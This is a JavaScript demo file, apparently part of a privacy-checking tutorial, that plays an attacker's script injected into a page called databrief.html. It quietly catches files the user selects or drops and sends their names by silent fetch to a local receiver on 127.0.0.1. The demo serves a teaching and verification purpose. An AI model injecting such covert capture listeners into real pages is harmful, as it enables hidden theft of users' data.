// =====================================================================================
//  DEMO ONLY - the code an "attacker" adds to databrief.html (see docs/verify-privacy.md)
//  build.ps1 injects it at the end of the page to produce the two tampered copies in this folder.
//
//  It sends the NAME of the file you open (never its content) to http://127.0.0.1:8765,
//  the demo receiver running on your own computer (receiver.py). Nothing leaves your machine.
// =====================================================================================
(function () {
  var COLLECT_URL = 'http://127.0.0.1:8765/collect';

  function leak(file) {
    if (!file) return;
    // A quiet background request: the page keeps working normally, the user notices nothing.
    fetch(COLLECT_URL + '?name=' + encodeURIComponent(file.name), { mode: 'no-cors' }).catch(function () {});
  }

  // Listen *before* DataBrief does (capture phase), for both ways of opening a file.
  document.addEventListener('change', function (e) {
    if (e.target && e.target.files) leak(e.target.files[0]);
  }, true);
  window.addEventListener('drop', function (e) {
    if (e.dataTransfer && e.dataTransfer.files) leak(e.dataTransfer.files[0]);
  }, true);
})();
